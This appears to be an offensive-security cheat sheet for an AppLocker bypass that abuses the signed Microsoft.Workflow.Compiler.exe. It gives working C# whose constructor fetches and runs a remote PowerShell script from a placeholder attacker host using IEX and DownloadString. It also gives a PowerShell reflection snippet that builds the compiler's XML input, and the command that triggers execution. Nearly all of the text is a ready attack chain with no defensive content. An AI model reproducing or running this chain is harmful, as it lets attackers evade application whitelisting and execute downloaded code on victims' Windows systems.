# 07.03 Microsoft.Workflow.Compiler AppLocker Bypass

> Section 8.4 · Native signed binary compiles + loads arbitrary C#

## Overview

Microsoft.Workflow.Compiler.exe (in C:\Windows\Microsoft.NET\Framework64\) is a signed Microsoft binary. It accepts an XML file (serialized WorkflowCompilerParameters) listing a C# source file, compiles it, and instantiates any class that inherits from System.Workflow.ComponentModel.Activity. The constructor of that class runs.

## Steps

- **C# source** — class inheriting Activity, payload in constructor.
- **Generate XML input** — use PowerShell reflection on SerializeInputToWrapper to produce the correct format with GenerateInMemory=true.
- **Run compiler** — `Microsoft.Workflow.Compiler.exe input.xml output.xml`.

## Commands

### C# Activity-derived class (payload in ctor)

```csharp
using System;
using System.Workflow.ComponentModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class RootActivity : Activity {
    public RootActivity() {
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        PowerShell ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript("IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')");
        ps.Invoke();
        rs.Close();
    }
}
```

### Generate XML with PowerShell reflection

```powershell
# Serialize WorkflowCompilerParameters to XML input
$asm = [Reflection.Assembly]::LoadFrom(
    'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll')
$wcp = New-Object Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$wcp.GenerateInMemory = $true
$inputFiles = @('C:\Windows\Tasks\RootActivity.cs')
$method = $asm.GetType(
    'System.Workflow.ComponentModel.Compiler.WorkflowCompilerInternal').
    GetMethod('SerializeInputToWrapper',
    [Reflection.BindingFlags] 'NonPublic,Static')
$method.Invoke($null, @($wcp, $inputFiles))  # writes input.xml

# Run (second arg is output file path — content unimportant)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe input.xml out.xml
```
